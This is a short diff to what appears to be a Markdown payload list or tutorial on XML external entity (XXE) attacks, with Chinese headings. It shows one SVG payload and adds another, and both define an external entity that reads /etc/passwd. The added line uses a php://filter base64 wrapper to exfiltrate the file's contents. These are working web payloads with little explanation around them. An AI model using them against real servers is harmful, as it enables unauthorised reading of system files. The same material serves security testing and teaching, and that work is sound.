@@ -105,6 +105,7 @@ $data = simplexml_load_string($xml);
 
 ```xml
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="640px" height="480px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]> <svg>&xxe;</svg>
 ```
 ## 实例
 
